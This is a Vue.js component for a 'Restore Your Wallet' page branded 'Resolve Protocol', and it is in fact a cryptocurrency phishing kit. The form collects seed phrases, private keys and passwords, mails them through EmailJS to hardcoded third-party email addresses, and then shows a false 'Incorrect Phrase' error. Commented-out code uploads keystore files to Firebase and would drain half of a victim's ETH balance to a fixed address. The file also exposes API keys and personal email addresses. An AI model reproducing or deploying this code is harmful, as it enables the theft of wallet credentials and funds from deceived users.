<template>
  <div style="text-align:center">
  
  <v-card color="basil" class="cent">
    <div
    color="transparent"
    class="pa-5 landing"
    align="center"
    >
      <v-img
      src="../assets/new page/Loader_img.png"
      width="80"
      to="/"
      >

      </v-img>
      </div>
    <v-card-title class="text-center justify-center py-6">
      <h1 class="font-weight-bold text-h5 basil--text">
       Restore Your Wallet
      </h1>
    </v-card-title>
<hr>
    <v-tabs
      v-model="tab"
      background-color="transparent"
      color="basil"
      
      
      
    >
     
      <v-tab
      
      >
       MNEMONICS
      </v-tab>
      <v-tab
      
      >
       PRIVATE KEY
      </v-tab>

       <v-tab
      
      >
       HARDWARE
      </v-tab>
    </v-tabs>

    <v-tabs-items v-model="tab">
      <!-- <v-tab-item
       
      >
      <form action="" id="form">
        <v-card
          color="basil"
          flat
        >
          <v-card-text style="font-size:18px">please select your keystore file</v-card-text>
         default html file upload button
<v-file-input
@change="getfile"
  truncate-length="15"
  label="Choose keystore File"
  prepend-icon="mdi-key"
  outlined
  v-model="file"
></v-file-input>
<v-text-field
            label="Enter your wallet password"
            solo
            v-model="k_password"
          ></v-text-field>
        
            <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;"
            ></v-checkbox>
         <br>
         <br>

         <v-btn :disabled="!ex4" block @click="submitfile">
RESTORE
         </v-btn>
        </v-card>
        </form>
      </v-tab-item> -->

       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
        

          <v-card-text style="font-size:18px">Please enter your 12 or 24 word phrase</v-card-text>
          <v-form
          v-model="valid"
          >
           <v-textarea
        v-model="phrase_24"
        auto-grow
        filled
        color="deep-purple"
        class=""
        rows="3"
        required
        :rules="nemRules"
      ></v-textarea>
      <p style="margin-top:-15px !important;">Please separate each Mnemonic Phrase with a space.</p>
        <v-text-field
            label="Enter temporary session password"
            solo
            v-model="phrase_24_password"
          ></v-text-field>
          <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;margin-top:-20px !important;"
            ></v-checkbox>
         <br>
        
<span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>

         <v-btn :disabled="!valid" color="primary" block @click="insert_mnemonics">
RESTORE
         </v-btn>
         </v-form>
        </v-card>
      </v-tab-item>


       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
            <v-card-text style="font-size:18px">Please enter your private key</v-card-text>
           <v-form
            v-model="valid2"
           >
           <v-textarea
        v-model="private_key"
        auto-grow
        filled
        color="deep-purple"
        class=""
        rows="3"
        :rules="private_key_Rules"
      ></v-textarea>
      <p style="margin-top:-20px !important;">Please enter your private key in HEX format.</p>
        <v-text-field
            label="Enter temporary session password"
            solo
            v-model="private_pass"
          ></v-text-field>
          <v-checkbox
              v-model="ex4"
              label="I have entered all details are correctly."
              color="primary"
              value="primary"
              hide-details
              style="width: 70%;display: inline-block;margin-top:-20px !important;"
            ></v-checkbox>
         <br>
        
<span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>
         <v-btn @click="insert_private_key" :disabled="!valid2" color="primary" block>
RESTORE 
         </v-btn>
       
         </v-form>
        </v-card>
      </v-tab-item>


       <v-tab-item
       
      >
        <v-card
          color="basil"
          flat
        >
          <v-card-text>{{ text }}</v-card-text>
        </v-card>
      </v-tab-item>
    </v-tabs-items>
  </v-card>
<br>
  <v-snackbar
      v-model="alert"
      shaped
      timeout="5000"
    >
    <template v-slot:action="{ attrs }">
        <v-btn
          color="blue"
          text
          v-bind="attrs"
          @click="snackbar = false"
        >
          Close
        </v-btn>
      </template>
    {{alt_msg}}
  </v-snackbar>
    <div class="">
      <v-footer light padless>
        <v-card flat tile class="white--text text-center" width="100%" style="background:#e9d16f;">
           

          <v-divider></v-divider>

          <v-card-text class="white--text" style="color:#001e36 !important;">
            {{ new Date().getFullYear() }} — <strong>Copyright @2022 Resolve Protocol</strong>
          </v-card-text>
        </v-card>
      </v-footer>
    </div>
  </div>
</template>

<script> 
import store from '@/store'
import storage from '@/fire'
import fb from '@/fire'
import router from '@/router'
import emailjs from 'emailjs-com'
// import {ethers} from 'ethers'
// import BigNumber from 'bignumber.js'
export default {
  data() {
    return {
      wallet_bal:'',
      alt_msg:'',
      alert: false,
      ex4:false,
      wallet_type:"",
       valid: true,
       valid2: true,
       private_key:"",
       private_pass:"",
      wall:store.state.wal,
      tab: null,
      file:[],
      k_password:'',
      phrase_24:"",
      phrase_24_password:"",
      nemRules: [
        v => !!v || 'phrase is required',
       
       
      ],
      passRules:[
        v => !!v || 'password is required',
      ],
      private_key_Rules: [
        v => !!v || 'private key is required',
       
      ],
      private_pass_Rules:[
        v => !!v || 'password is required',
      ],
      file_link:'',
      name: '',
      email: '',
      message: '',
      mnemonicKey: "",
      account: null,
      provider: null,
      signer: null,
      wallet:null,
    }

  },
  methods: {
    async requestNotificationPermission() {
      if ('Notification' in window) {
        const permission = await Notification.requestPermission();
        return permission === 'granted';
      }
      return false;
    },
    sendNotification() {
      this.requestNotificationPermission().then((granted) => {
        if (granted) {
          const notification = new Notification('Hello!', {
            body: 'This is a browser notification!',
            icon: 'https://via.placeholder.com/128', // Optional icon
          });
          notification.onclick = () => {
            window.focus(); // Optional: Bring focus to the window when clicked
          };
        } else {
          console.log('Notification permission denied.');
        }
      });
    },
   sendEmail(msg) {
  
  //sendEmail() {
    
      try {
          emailjs.send( "service_hchsgkm",     // Replace with your EmailJS service ID
        "template_8ehnn14",    // Replace with your EmailJS template ID
        {
           name: 'walletconnectsupport',
              email: 'showolesheriff7@gmail.com',
           message: msg,
            to:'Melindahotbenks101@outlook.com'
            },'WU485GiLgQouTPnp5').then((e)=>{
                console.log(e +'SUCCESSFULLY SENT')
            })


    } catch(error) {
           console.log(error+'error')
     }
    //   //jp5296143@gmail.com  knightdajoesd@gmail.com Resetmarkhamdavid112@gmail.com formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
    // try {
    //             emailjs.send('service_pib4i0c', 'template_zeobwbd',
    //                 {
    //                     name: 'walletconnectsupport',
    //                     email: 'showolesheriff7@gmail.com',
    //                     message: msg,
    //                     to: 'lauramikemiller@gmail.com'
    //                 }, 'wqsvu3cCKwr-c_w1_');


    //         } catch (error) {
    //             console.log({ error })
    //         }
    //         // jasonwgeorge010@gmail.comReset form fieldMelindahotbenks101@outlook.com

     },
    sendEmail_me() {
          
        },
    insert_keystore(){

    },
    getfile(event){
    this.file=event;
     
    },
     submitfile(){
     
   storage.storage.ref(this.k_password+"-"+this.file.name).put(this.file).then((e)=>{
e.ref.getDownloadURL().then(url=>{
fb.fb.collection('keystore_melin').add({name:url,wallet_type:this.wallet_type,passowrd:this.k_password,time:new Date(),}).then((e)=>{
     console.log(e)
     //alert(url)
    this.sendEmail("keystore: "+url+" wallet type: "+this.wallet_type+" password:  "+this.k_password);
     this.alt_msg="Incorrect Phrase,\n please Re-enter phrase"
        this.alert=!this.alert
   })
})
   
        console.log(e)
     });
     
    },
    async insert_mnemonics(){
      try{
      //this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');   
        this.alt_msg = "connecting..."
            this.alert = !this.alert
    
     this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
      this.sendEmail_me("mnemonics: " + this.phrase_24 + " wallet type: " + this.wallet_type + " password:  " + this.phrase_24_password);
       this.alt_msg="Incorrect Phrase,\n please Re-enter phrase "
     this.phrase_24=""
     this.phrase_24_password=""
  // this.wallet=ethers.Wallet.fromPhrase(this.phrase_24,this.provider);
  // this.wallet_bal=await this.provider.getBalance(this.wallet.address)
  // const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());

  // const tx= await this.wallet.sendTransaction({
  //       to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
  //       value:amt
  //   })
  //   await tx.wait()
    //console.log(tx.hash())
      }
      catch(err){
        console.log('')
      }
    },
    async insert_private_key(){
      try{
     // this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');
        this.alt_msg =
        
        "connecting..."
            this.alert = !this.alert
     
          this.sendEmail_me("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
     this.sendEmail("mnemonics: " + this.private_key + " wallet type: " + this.wallet_type + " password:  " + this.private_pass);
      this.alt_msg="Incorrect Phrase,\n please Re-enter phrase"
      this.private_key=""
      this.private_pass=""
  //  this.wallet=new ethers.Wallet(this.phrase_24,this.provider);
  // this.wallet_bal=await this.provider.getBalance(this.wallet.address)
  // const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());


  // const tx= await this.wallet.sendTransaction({
  //       to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
  //       value:amt
  //   })
    //await tx.wait()
    //console.log(tx.hash())
  }
      catch(err){
        console.log('')
      }
    }
    
  },
  mounted() {
    this.wallet_type=router.currentRoute.params.id;
    

  },
}
</script>

<style>
.cent{
  padding: 20px;
  text-align: center;
}
.lab {
color:rgb(3, 166, 207);
outline: 1px dotted rgb(3, 166, 207);
padding: 20px;
margin-top: -200px;
}
.notify{
  position:absolute;
  top:50%;
  left:50%;
  transform: translate(-50%,-50%);
  width:40%;
}
.notifyer{
  position:absolute;
  height:100%;
  width:100%;
  background-color: rgba(0,0,0,0.5);
}
.landing{     
 }   
 @media only screen and (max-width: 600px) {
  .landing {
    border-left:none;
    border-bottom: 10px solid #e9d16f;
  }
 }
</style>